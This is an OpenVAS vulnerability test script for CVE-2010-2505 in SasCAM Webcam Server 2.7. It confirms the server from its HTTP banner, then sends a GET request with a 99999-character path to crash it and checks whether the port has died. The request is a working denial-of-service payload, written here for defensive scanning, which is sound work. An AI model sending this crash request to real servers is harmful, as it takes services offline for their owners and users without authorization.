###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_sascam_webcam_server_dos_vuln.nasl 8207 2017-12-21 07:30:12Z teissa $
#
# SasCAM Request Processing Denial of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to crash the server
process, resulting in a denial-of-service condition.

Impact Level: Application";

tag_affected = "Soft SaschArt SasCAM Webcam Server 2.7 and prior";

tag_insight = "The flaw is due to an error when handling certain requests, which
can be exploited to block processing of further requests and terminate the
application by sending specially crafted requests.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running SasCam Webcam Server and is prone to denial
of service vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901132");
  script_version("$Revision: 8207 $");
  script_tag(name:"last_modification", value:"$Date: 2017-12-21 08:30:12 +0100 (Thu, 21 Dec 2017) $");
  script_tag(name:"creation_date", value:"2010-07-02 08:02:13 +0200 (Fri, 02 Jul 2010)");
  script_cve_id("CVE-2010-2505");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("SasCAM Request Processing Denial of Service Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/40214");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/13888");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("SaServer/banner");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");

## Get HTTP Port
port = get_http_port(default:8080);
if(!port) {
  exit(0);
}

banner = get_http_banner(port:port);

## Confirm Application
if("Server: SaServer" >< banner)
{
  ## Open Socket
  sock = http_open_socket(port);
  if(!sock) {
    exit(0);
  }

  ## Sending Crash
  crash = http_get( item:"/"+ crap(99999),  port:port);
  send(socket:sock, data:crash);
  http_close_socket(sock);

  ## Check Port Status
  if (http_is_dead(port: port))
  {
    security_message(port);
    exit(0);
  }
}

